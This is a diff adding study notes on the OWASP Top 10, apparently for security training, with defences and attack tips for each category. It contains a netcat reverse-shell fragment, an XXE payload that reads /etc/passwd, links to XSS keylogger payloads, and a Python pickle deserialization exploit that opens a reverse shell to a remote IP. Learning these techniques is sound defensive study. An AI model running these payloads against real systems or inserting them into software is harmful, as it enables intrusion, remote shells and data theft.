@@ -1,0 +1,236 @@
+= OWASP
+
+== Severity 1: Injection
+This flaw occurs because user controlled input is interpreted as actual commands or parameters by the application.
+
+* SQL injection: user input is passed to SQL queries
+* Command injection: user input is passed to system commands
+* Email injection: send email messages without prior authorization by the email server -> add extra data to fields which are not interpreted by the server correctly
+
+Defense against that:
+
+* Use allow list: when input is sent to the server, input is compared to a list of safe input or characters
+* Strip input: if the input contains dangerous characters, these characters are removed before they are processed
+
+Use libraries to do this task, do not implement it.
+
+Command injection can result in reverse shell. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md[Cheat sheet]
+
+[source,shell]
+-----
+;nc -e /bin/bash
+-----
+
+Active command injection returns the result, blind does not.
+
+=== In practice
+
+|===
+|OS |Command
+
+|Linux
+|whoami
+
+|Linux
+|id
+
+|Linux
+|ifconfig / ip addr
+
+|Linux
+|uname -a
+
+|Linux
+|ps -ef
+
+|Windows
+|whoami
+
+|Windows
+|ver
+
+|Windows
+|ipconfig
+
+|Windows
+|tasklist
+
+|Windows
+|netstat -an
+
+|===
+
+== Severity 2: Broken Authentication
+Some common flaws in authentication mechanisms:
+
+* Brute force attacks
+* Use of weak credentials: web app should set strong password policies
+* Weak session cookies: if session cookie contains predictable values, it is easily forged
+
+Various mitigations:
+
+* avoid password guessing attacks by ensuring a strong password policy
+* avoid brute force attacks by ensuring the app enforces an automatic lockout after a certain number of attempts
+* implement Multi-Factor Authentication
+
+=== In practice
+Try to re-register an existing user with slight modification like " admin" with a space. Based on the web app implementation, it is possible to get the same rights as the normal admin.
+
+== Severity 3: Sensitive Data Exposure
+Could be directly linked to personal info (name, date of birth, financial info, ...) but also something technical such as usernames and password.
+
+Normally with man in the middle attack but this can also be seen in bad web applications.
+
+Example: SQLite database accessible to webapp's users (root directory).
+
+=== In practice
+Check source code for clues (comments, ...), scan website folders with tools or manually, ...
+
+== Severity 4: XML External Entity (XEE)
+Vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service attack, Server-Side Request Forgery (SSRF), port scanning, remote code execution.
+
+XML is a case-sensitive language!
+
+Two types:
+
+* In-band XXE: attacker receives an immediate response to the XXE payload
+* Out-of-band XXE / Blind XXE: no immediate response from web application so we must reflect the output to some file or our server
+
+=== In practice
+Use Document Type Definition (DTD)
+
+[source,xml]
+----
+<!DOCTYPE note [
+    <!ELEMENT note (to,from,heading,body)>
+    <!ELEMENT to (#PCDATA)>
+    <!ELEMENT from (#PCDATA)>
+    <!ELEMENT heading (#PCDATA)>
+    <!ELEMENT body (#PCDATA)>
+]>
+----
+
+* !DOCTYPE defines root element
+* !ENTITY defines an entity
+* !ELEMENT defines an element
+* #PCDATA means parseable character data
+
+Payload:
+[source,xml]
+----
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+----
+
+== Severity 5: Broken Access Control
+Access protected pages as a simple user -> access controls are broken because the user may be able to view sensitive info or access unauthorized functionality.
+
+* Horizontal privilege escalation: access data from another user with the same level of permissions
+* Vertical privilege escalation: access data from another user with higher level of permissions
+
+Example:
+
+* manually update query parameters -> http://example.com/app/accountInfo?acct=notmyacct
+* force browse target URLs -> http://example.com/app/admin_getappInfo
+
+To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.
+
+A good way to stop users from accessing sensitive resource is to only load parts of the application that need to be used by them. This stops sensitive information such as an admin page from been leaked or viewed.
+
+=== In practice
+Use insecure direct object reference (IDOR) by exploiting a misconfiguration in the way user input is handled
+
+== Severity 6: Security Misconfiguration
+Security misconfigurations include:
+
+* Poorly configured permissions on cloud services, like S3 buckets
+* Having unnecessary features enabled, like services, pages, accounts or privileges
+* Default accounts with unchanged passwords
+* Error messages that are overly detailed and allow an attacker to find out more about the system
+* Not using https://owasp.org/www-project-secure-headers/[HTTP security headers], or revealing too much detail in the Server: HTTP header
+
+https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html[OWASP top 10 security misconfiguration]
+
+=== In practice
+Test for default passwords. Look for the app source code on GitHub or the documentation.
+
+== Severity 7: Cross-Site Scripting (XSS)
+Attacker executes malicious scripts on the victim's machine using a web application. This happens with unsanitized user input (JavaScript, VBScript, Flash and CSS).
+
+Main types of XSS:
+
+* Stored XSS: most dangerous, malicious string originates from website's database
+* Reflected XSS: malicious payload is part from the victims request to the website. Payload is included in response back to the user. Attacker needs to trick the victim into clicking a URL to execute the malicious payload
+* DOM-Based XSS: change page that is displayed in the browser
+
+XSS payloads (http://www.xss-payloads.com/):
+
+* popup: <script>alert(“Hello World”)</script>
+* write HTML: document.write
+* XSS keylogger: http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
+* port scanning: http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html
+
+=== In practice
+Check payloads for stored/reflected XSS.
+
+Check if we can get document.cookie, ...
+
+== Severity 8: Insecure Deserialization
+Replacing data processed by an application with malicious code allowing anything from DoS to remote code execution (RCE)
+
+* low exploitability, no reliable tool/framework, need good understand of the inner-working
+* only as dangerous as the attacker's skill permits and the value of the data that is exposed. If only a DoS is available, some organisations will recover, some won't.
+
+Any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained:
+
+* e-commerce sites
+* forums
+* API
+* application runtime (tomcat, jenkins, jboss, ...)
+
+Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage. Deserialization is converting serialised information into their complex form - an object that the application will understand.
+
+=== In practice
+If a flask app, we can create a payload (if base64) to create a reverse shell. This payload should be added to the cookie that is being deserialized by the server. We need to know (open source or guess) the logic in the server to process our input.
+
+[source,python]
+----
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.10.164.135 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+----
+
+== Severity 9: Components with known vulnerabilities
+Find version of the application being used and look online for known vulnerabilities like in https://www.exploit-db.com/exploits/41962[exploit-db.com]
+
+== Severity 10: Insufficient Logging and Monitoring
+Every action performed by the user should be logged. Without logging, we can't tell what actions an attacker performed if they gain access to particular web applications. This can help against regulatory damages (know what the attacker got for regulations) or risk of further attacks.
+
+Info in logs should include:
+
+* HTTP status code
+* timestamps
+* usernames
+* API endpoint and page locations
+* IP addresses
+
+Logs must be encrypted, secured and copied in multiple locations.
+
+Monitor and detect suspicious activities:
+
+* multiple unauthorized attempts for a particular actions
+* requests from anomalous IP addresses or locations
+* use of automated tools (User-Agent, speed of requests)
+* common payloads (XSS)
+
+=== In practice
